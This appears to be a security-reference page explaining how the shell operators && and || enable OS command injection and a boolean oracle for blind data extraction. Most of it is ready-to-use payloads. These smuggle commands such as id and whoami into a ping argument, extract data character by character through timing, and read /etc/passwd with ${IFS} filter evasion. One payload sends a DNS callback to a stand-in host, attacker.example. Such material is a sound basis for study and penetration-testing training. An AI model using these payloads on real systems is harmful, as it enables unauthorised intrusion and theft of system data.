---
title: "Conditional command chaining with && and || as a boolean oracle"
description: "Using the AND (&&) and OR (||) shell operators to run commands on success or failure and to build a boolean exfiltration oracle in blind OS command injection."
keywords:
  - command injection
  - conditional chaining
  - logical operators
  - boolean oracle
  - blind command injection
  - shell injection
---

# Conditional execution (&& and ||)

The shell's logical operators chain commands on the **exit status** of the one before. `a && b` runs `b` only if `a` succeeds (exit code 0); `a || b` runs `b` only if `a` fails (non-zero). In OS command injection these give both a way to run a second command and a ready-made **boolean oracle** for blind extraction.

## Mechanism

Given a sink like `ping -c 1 <host>`:

```
127.0.0.1 && id      # id runs because ping succeeded
notahost || id       # id runs because the lookup failed
```

`&&` is useful when the intended command normally succeeds and you want your payload to follow it cleanly. `||` is the inverse: feed a value that makes the first command fail, and your command runs instead. Together they let you fire a payload whatever the host-side command does.

## The boolean oracle

The real power of conditional chaining is turning a true/false condition into an observable side effect. Make an observable action (a delay, a DNS callback) run **only when a condition holds**:

```
127.0.0.1 && [ $(whoami) = root ] && sleep 10
127.0.0.1 && [ $(id -u) -eq 0 ] && nslookup t.OOB_ID.attacker.example
```

If the response takes ten seconds (or the DNS hit lands), the condition was true. This is the same inference primitive used in blind SQL injection, applied to shell output.

### Char-by-char extraction

Combine the oracle with string slicing to read data one character at a time:

```
127.0.0.1 && [ "$(id|cut -c1)" = "u" ] && sleep 10
127.0.0.1 && [ "$(cut -c1 /etc/hostname)" = "a" ] && sleep 10
```

Iterate the position and the guessed character; a delay confirms each match. `grep`/`expr` comparisons work where `[` is filtered:

```
127.0.0.1 && expr $(id -u) = 0 && sleep 10
```

## Context and spacing

As with any shell separator, mind quoting and filtered spaces:

```
"; whoami && echo "          # break out of double quotes first
127.0.0.1&&cat${IFS}/etc/passwd   # ${IFS} for a space-less payload
```

## Platform note

`&&` and `||` behave identically on Windows `cmd.exe`:

```
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 && ping -n 10 127.0.0.1    # timing on Windows uses -n
```

PowerShell 7+ also supports `&&`/`||`; older Windows PowerShell does not, so fall back to `if`/`;` there.

## References

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: Blind OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
